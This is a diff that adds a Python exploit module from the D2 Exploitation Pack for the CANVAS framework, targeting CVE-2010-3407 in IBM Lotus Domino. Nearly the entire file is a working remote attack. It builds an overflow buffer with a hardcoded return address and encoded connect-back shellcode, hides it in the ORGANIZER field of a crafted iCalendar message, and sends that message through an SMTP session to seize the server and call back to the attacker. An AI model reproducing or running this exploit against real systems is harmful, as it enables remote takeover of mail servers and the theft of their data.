@@ -1,0 +1,201 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2010
+#
+
+
+import sys
+
+if "." not in sys.path: 
+	sys.path.append(".")
+
+import struct
+import canvasengine
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from shellcode import shellcodeGenerator
+from encoder import alphanumeric
+
+# GUI info
+NAME = "IBM Lotus Domino iCalendar Email Address Stack Buffer Overflow Vulnerability"
+
+DESCRIPTION = "Stack Overflow Vulnerability in IBM Lotus Domino iCalendar Email Address"
+
+DOCUMENTATION = {}
+DOCUMENTATION['VENDOR'] = "IBM"
+DOCUMENTATION["Repeatability"] = "One"
+DOCUMENTATION["Date public"] = "2010.09.14"
+DOCUMENTATION["References"] = "http://labs.mwrinfosecurity.com/advisories/lotus_domino_ical_stack_buffer_overflow/"
+DOCUMENTATION["Versions Affected"] = "Lotus Domino Server 8.0.2 < 8.0.2 FP 5, 8.5.1 < 8.5.1 FP 2"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "CVE-2010-3407"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3407"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = "1.0"
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+PROPERTY['VERSION'] = [ "2003" ]
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+targets = {    
+    0 : [ "Lotus Domino Server 8.x", 0x7c345c30 ], # push esp, ret @ MSVCR71.dll
+}
+
+class theexploit(tcpexploit):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        self.setInfo(DESCRIPTION)
+        self.name = NAME      
+        self.email = "" 
+        self.port = 25        
+        self.version = 0
+        self.badstring = "\0"
+        return
+
+
+    def neededListenerTypes(self):
+        from canvasengine import WIN32MOSDEF
+        return [WIN32MOSDEF]    
+
+
+    def createShellcode(self):
+        if self.callback:
+        	host = self.callback.ip
+        	port = self.callback.port       
+      	      	      
+        self.shellcode = self.createHeapSafeInject(self.badstring, host, port)
+
+        encoder         = alphanumeric.AlphaNum()
+        totopc          = encoder.seh_pc()
+        getpc           = encoder.get_pc(reg='ecx')
+        
+        payload         = encoder.encode(self.shellcode)
+        self.shellcode  = totopc + getpc + payload         
+        
+        
+    def run(self):
+        # Check arguments
+        self.host = self.target.interface                
+        self.port = int(self.argsDict.get("port", self.port))
+        self.email = self.argsDict.get("email", self.email)
+        
+        self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))        
+        self.log("Version %d "%(self.version))     
+        self.log("Attacking %s:%d"%(self.host, self.port))
+        
+        sploitstring = self.makesploit()
+                
+        s = self.gettcpsock()
+        s.connect((self.host, self.port))
+        
+        s.recv(1024)
+        data = "HELO D2\r\n"
+        s.send(data)
+        s.recv(1024)
+        
+        data = "MAIL FROM: d2@d2sec.com\r\n"
+        s.send(data)
+        s.recv(1024)
+        
+        data = "RCPT TO: " + self.email + "\r\n"
+        s.send(data)
+        s.recv(1024)
+        
+        data = "DATA\r\n"
+        s.send(data)
+        s.recv(1024)
+        
+        s.send(sploitstring + "\r\n.\r\n")
+        s.recv(1024)
+        
+        data = "QUIT\r\n"
+        s.send(data)
+        s.recv(1024)
+        s.send(sploitstring)        
+
+        ret = self.ISucceeded()
+        
+        if not ret:
+        	self.log("Sleeping for two seconds to check for callback")
+        	time.sleep(2)
+        	ret = self.ISucceeded()        
+
+        if ret:
+        	self.setInfo("%s attacking %s:%d (succeeded!)" % (self.name, self.host, self.port), showlog=True)
+        	self.log("%s done (succeeded!)" % self.name)            
+        
+        return ret
+        
+        
+    def makesploit(self):				
+    	os_name, eip = targets[self.version]
+    	ret = struct.pack('<L', eip)
+        buff = ("A" * 2373) + ret + "B"*100 + self.shellcode + "C"*100
+        
+        data = """Content-class: urn:content-classes:calendarmessage
+Content-Type: text/calendar;
+	method=COUNTER;
+	name="meeting.ics"
+Content-Transfer-Encoding: 8bit
+
+BEGIN:VCALENDAR
+METHOD:COUNTER
+PRODID:Microsoft CDO for Microsoft Exchange
+VERSION:2.0
+BEGIN:VEVENT
+SUMMARY:D2 Exploitation Pack
+UID:040000008200E00074C5B7101A82E0080000000090E6630B8559CB0100000000000000001000000098B836458E17F1419CCF17B67E522FF2
+ATTENDEE;ROLE=REQ-PARTICIPANT;PARTSTAT=NEEDS-ACTION;RSVP=TRUE;CN="D2":MAILTO:support@d2sec.com
+ORGANIZER:MAILTO:MAILTOOVERFLOW
+LOCATION:Miami
+DESCRIPTION:D2 Exploitation Pack\N
+SEQUENCE:0
+PRIORITY:5
+CLASS:
+CREATED:20100921T100349Z
+LAST-MODIFIED:20100921T100349Z
+STATUS:CONFIRMED
+TRANSP:OPAQUE
+END:VEVENT
+END:VCALENDAR
+        """
+
+        sploitstring = data.replace("MAILTOOVERFLOW", "d2@%sd2sec.com" % buff)			
+	
+    	return sploitstring
+      
+        		
+    def displayVersions(self):
+    	i = 0
+    	print 'Available versions:'
+    	for listline in targets.values():
+    		print "\t%d: %s" % (i,listline[0])
+    		i += 1
+
+
+    def usage(self):
+    	print "Usage: %s -v version -t targethost -p port -l localip -d localport\n" % (sys.argv[0])
+    	self.displayVersions()
+    	sys.exit(0)
+
+
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+    app = theexploit()
+    ret = standard_callback_commandline(app)
